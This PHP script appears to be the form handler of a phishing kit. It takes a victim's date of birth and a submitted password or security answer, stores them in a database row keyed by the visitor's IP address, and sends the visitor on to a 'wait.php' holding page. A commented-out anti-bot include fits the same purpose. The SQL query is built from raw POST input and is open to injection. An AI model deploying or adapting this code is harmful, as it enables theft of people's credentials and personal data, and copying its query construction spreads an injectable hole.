<?php
//require_once('../antibot8/code/include.php');
session_start();

$coxfile= "cox.php";

include $coxfile;



$ip= $_SERVER['REMOTE_ADDR'];
$pin=$_POST['DD'].'/'.$_POST['MM'].'/'.$_POST['YYYY'];
if(isset($_POST['pass1'])){
   $reponse=$_POST['pass1'];
 $sql ="UPDATE user set reponse ='$reponse' , pin='$pin', page='',lastpage='wait.php' where IP='$ip';";
}
else{
   $reponse="";
  $sql ="UPDATE user set reponse ='$reponse',pin='$pin', page='',lastpage='wait.php' where IP='$ip';";
}

   $ret = $db->exec($sql);
   if(!$ret) {
      //echo $db->lastErrorMsg();
   } else {
      //echo $db->changes(), " <center><h1>successfully</h1></center>";
   }
   $db->close();

	//header("Location: $back");
echo "<script>location.replace('wait.php');</script>";
?>
